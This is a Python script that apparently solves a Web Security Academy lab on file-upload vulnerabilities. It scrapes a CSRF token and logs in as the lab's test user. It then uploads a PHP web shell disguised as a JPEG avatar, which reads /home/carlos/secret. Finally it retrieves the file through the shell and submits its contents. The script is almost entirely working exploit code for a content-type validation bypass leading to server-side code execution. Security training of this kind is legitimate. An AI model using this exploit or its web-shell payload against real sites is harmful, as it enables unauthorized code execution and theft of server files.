import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac641fd31f2a0707c0ff2959003f0010.web-security-academy.net'

login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

login_data = {'password': 'peter', 'username': 'wiener', 'csrf': csrf}
resp = s.post(login_url, data=login_data)

soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

upload_url = f'https://{site}/my-account/avatar'
multipart_form_data = {
    'csrf' : (None, csrf),
    'user' : (None, 'wiener'),
    'avatar' : ('secret.php', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'image/jpeg')
}
resp = s.post(upload_url, files=multipart_form_data)
print(resp.text)

secret_url = f'https://{site}/files/avatars/secret.php'
resp = s.get(secret_url)
secret = resp.text

solution_url = f'https://{site}/submitSolution'
solution_data = {
    'answer': secret
}
s.post(solution_url, data=solution_data)
